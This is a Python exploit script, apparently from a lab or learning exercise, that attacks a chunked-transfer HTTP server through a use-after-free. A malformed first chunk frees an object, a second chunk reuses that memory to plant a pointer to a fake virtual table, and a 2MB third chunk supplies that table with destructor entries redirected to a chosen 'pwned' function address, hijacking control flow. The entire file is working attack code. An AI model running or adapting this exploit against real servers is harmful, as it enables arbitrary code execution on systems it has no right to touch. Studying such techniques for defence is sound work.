#!/usr/bin/env python3


import struct
from argparse import ArgumentParser
from base64 import b64encode
from functools import partial
from http.client import HTTPConnection


POINTER_SIZE = 4
CHUNK_OBJECT_SIZE = 12
# Threshold for the buffer size above which the buffer always get allocated at the same address with a 32-bit executable
# TODO: Why do we already get a fixed address with a size of 2MB?
FIXED_ADDR_BUFFER_SIZE_THRESHOLD = 0x00200000  # 2MB


def main():
    parser = ArgumentParser()
    parser.add_argument("--target-host", "-H", default="localhost")
    parser.add_argument("--target-port", "-P", type=int, default=9999)
    parser.add_argument("--pwned-dtor-address", type=partial(int, base=16), required=True)
    parser.add_argument("--buffer-address", type=partial(int, base=16), required=True)
    args = parser.parse_args()

    conn = HTTPConnection(args.target_host, args.target_port)
    conn.connect()
    input("Press any key to send request... ")
    conn.request(
        "POST",
        "/",
        headers={
            "Content-Type": "application/octet-stream",
            "Transfer-Encoding": "chunked"
        },
        encode_chunked=True,
        body=[
            # 1st chunk with incorrectly base64-encoded data (just one character) that results in an error when the
            # target tries to decode it. The corresponding chunk object will be overwritten by the 2nd chunk.
            b"x",

            # 2nd chunk, contains the pointer to the fake virtual table delivered in the 3rd chunk. The size of the
            # base64-decoded chunk has to be the same as the size of the chunk objects so the buffer for the decoded
            # data will re-use the memory of the freed object from chunk 1. Thereby we replace the original table.
            b64encode(
                struct.pack("<L", args.buffer_address) +   # pointer to virtual table
                b"x" * (CHUNK_OBJECT_SIZE - POINTER_SIZE)  # to fill the buffer
            ),

            # 3rd chunk
            # We construct a fake virtual table with pwned_destructor() as a replacement for the real destructor(s).
            # See https://shaharmike.com/cpp/vtable-part1/ and
            # https://www.martinkysel.com/demystifying-virtual-tables-in-c-part-3-virtual-tables/ for details.
            # The size of the base64-decoded chunk has to be large enough so the buffer for it always get allocated
            # at the same address.
            b64encode(
                struct.pack("<L", args.pwned_dtor_address) +          # pointer to the complete object destructor
                struct.pack("<L", args.pwned_dtor_address) +          # pointer to the deleting destructor
                b"x" * (FIXED_ADDR_BUFFER_SIZE_THRESHOLD - (2 * POINTER_SIZE))  # to fill the buffer
            ),
        ]
    )
    resp = conn.getresponse()
    print(f"Target replied with status {resp.status} {resp.reason}")

    input("Press any key to close connection...")
    conn.close()


if __name__ == '__main__':
    main()
